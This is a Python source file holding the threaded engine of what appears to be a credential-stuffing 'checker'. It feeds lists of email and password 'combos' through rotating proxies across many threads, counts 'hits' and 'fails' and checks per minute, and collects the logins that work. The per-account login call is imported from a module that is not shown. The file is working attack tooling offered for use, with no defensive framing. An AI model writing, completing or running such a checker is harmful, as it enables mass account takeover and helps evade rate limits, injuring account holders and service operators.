"""Multi-threaded checking engine."""

from __future__ import annotations

import itertools
import threading
import time
from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field

from .api import AccountResult, check_account


@dataclass
class CheckerStats:
    total: int = 0
    checked: int = 0
    hits: int = 0
    fails: int = 0
    start_time: float = field(default_factory=time.time)

    @property
    def cpm(self) -> float:
        elapsed = max(time.time() - self.start_time, 0.001)
        return (self.checked / elapsed) * 60

    @property
    def elapsed(self) -> float:
        return time.time() - self.start_time


class CheckerEngine:
    def __init__(
        self,
        combos: list[tuple[str, str]],
        proxies: list[str],
        threads: int = 5,
        on_hit: Callable[[AccountResult], None] | None = None,
        on_fail: Callable[[AccountResult], None] | None = None,
        on_progress: Callable[[CheckerStats], None] | None = None,
        on_log: Callable[[str], None] | None = None,
    ) -> None:
        self.combos = list(combos)
        self.proxies = list(proxies)
        self.threads = max(1, min(threads, 100))
        self.on_hit = on_hit
        self.on_fail = on_fail
        self.on_progress = on_progress
        self.on_log = on_log
        self._stop = threading.Event()
        self._lock = threading.Lock()
        self.stats = CheckerStats(total=len(combos))

    def stop(self) -> None:
        self._stop.set()

    def is_stopped(self) -> bool:
        return self._stop.is_set()

    def _proxy_cycle(self):
        if not self.proxies:
            return itertools.repeat(None)
        return itertools.cycle(self.proxies)

    def _log(self, message: str) -> None:
        if self.on_log:
            self.on_log(message)

    def _emit_progress(self) -> None:
        if self.on_progress:
            self.on_progress(self.stats)

    def run(self) -> list[AccountResult]:
        hits: list[AccountResult] = []
        proxy_iter = self._proxy_cycle()

        self.stats.start_time = time.time()
        self._log(f"Starting {self.stats.total} combos with {self.threads} threads")

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {}
            for email, password in self.combos:
                if self.is_stopped():
                    break
                proxy = next(proxy_iter)
                fut = pool.submit(check_account, email, password, proxy)
                futures[fut] = (email, password)

            for fut in as_completed(futures):
                if self.is_stopped():
                    break
                email, password = futures[fut]
                try:
                    result = fut.result()
                except Exception as exc:
                    result = AccountResult(
                        email=email,
                        password=password,
                        success=False,
                        message=str(exc),
                    )

                with self._lock:
                    self.stats.checked += 1
                    if result.success:
                        self.stats.hits += 1
                        hits.append(result)
                    else:
                        self.stats.fails += 1

                if result.success:
                    self._log(f"HIT  {result.summary_line()}")
                    if self.on_hit:
                        self.on_hit(result)
                else:
                    short = result.message[:80] if result.message else "failed"
                    self._log(f"FAIL {email} | {short}")
                    if self.on_fail:
                        self.on_fail(result)

                self._emit_progress()

        self._log("Finished")
        return hits
